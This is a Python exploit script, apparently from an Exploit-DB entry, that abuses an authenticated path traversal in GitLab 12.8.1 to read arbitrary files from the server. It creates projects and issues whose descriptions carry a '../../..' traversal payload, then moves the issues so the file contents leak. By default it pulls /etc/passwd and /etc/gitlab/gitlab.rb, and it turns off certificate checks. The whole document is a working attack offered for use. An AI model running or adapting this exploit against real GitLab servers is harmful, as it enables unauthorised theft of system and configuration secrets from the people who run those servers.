#!/usr/bin/python3
# Exploit Title: Gitlab 12.8.1 - Arbitrary File Read (Authenticated)
# Original Exploit: https://www.exploit-db.com/exploits/49076
# Original Exploit Author: Jasper Rasenberg
# Date: 11/25/2020
# Exploit Author: JustMichi
# Vendor Homepage: https://about.gitlab.com
# Software Link: https://about.gitlab.com/install
# Version: tested on gitlab version 12.8.1
# Tested on: Kali Linux 2020.4

# after I struggled a lot to make the original exploit working, I modified it a bit.

# You can create as many personal access tokens as you like from your GitLab profile.
#   Sign in to GitLab.
#    In the upper-right corner, click your avatar and select Settings.
#    On the User Settings menu, select Access Tokens.
#    Choose a name and optional expiry date for the token.
#    Choose the desired scopes.
#    Click the Create personal access token button.
#    Save the personal access token somewhere safe. If you navigate away or refresh your page, and you did not save the token, you must create a new one.

# Prerequisites
# pip3 install requests
# sudo apt-get install python3-gitlab

import sys
import os
import requests
import json
import random
import string
from time import sleep
from gitlab import *
import argparse

parser = argparse.ArgumentParser(prog='gitlabLFE.py',
        description='exploit for the gitlab local file inclusion. modify the variable pullfiles to include\
        all the files you want to get from the host.')
parser.add_argument("host", type=str, help="hostname of the gitlab instance, e.g. https://git.xxx.yyy")
parser.add_argument("token", type=str, help="the API access token generated within the gitlab account")
parser.add_argument("--verifySSL", help="use 'cert.pem' in the current working dir to \
        verify the server certificate", action="store_true")
parser.add_argument("-f", "--filelist", type=str, help="the relative path to the file containing\
        a list with all files you want to pull via LFE")

args = parser.parse_args()

if len(sys.argv) < 2:
    parser.print_usage()
    sys.exit()

token = args.token
host = args.host
files = args.filelist
requests.packages.urllib3.disable_warnings() 

session = requests.Session()
if args.verifySSL:
    session.verify = f'{os.getcwd()}/<cert.pem>'
else:
    session.verify = False

pullfiles = []

# which files to pull
if files and len(files) > 0:
    with open(files) as f:
        content = f.readlines()
        for x in content:
            pullfiles.append(x.strip())
else:
    pullfiles = ["/etc/passwd",
        "/etc/gitlab/gitlab.rb",
        "/etc/issue"
        ]


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


def exploit(projectName, issueTitle):
    print(f"[*] starting gitlab session at {host} with token {token}")
    gl = Gitlab(host, private_token=token, session=session)
    gl.auth()
    print(f"[*] creating projects {projectName} 1 and 2")
    p1 = gl.projects.create({'name': f"{projectName}-1"})
    p2 = gl.projects.create({'name': f"{projectName}-2"})

    for i, f in enumerate(pullfiles):
        stripped_f = f.rstrip('\n')
        print(f"[*] creating issue to pull file {f}")
        issue = p1.issues.create({ \
                'title': f"{issueTitle}-{stripped_f}",
                'description': \
                "![a](/uploads/11111111111111111111111111111111/"\
                f"../../../../../../../../../../../../../..{stripped_f})"})
        print(issue.description)
        sleep(3)
        try:
            issue.move(p2.id)
        except Exception as e:
            pass
        sleep(3)

if __name__ == "__main__":
    projectname = get_random_string(15)
    issue = get_random_string(5)
    exploit(projectname, issue)
    print(f"Done. Check the issues of {projectname}-2 to find the leaked files.")
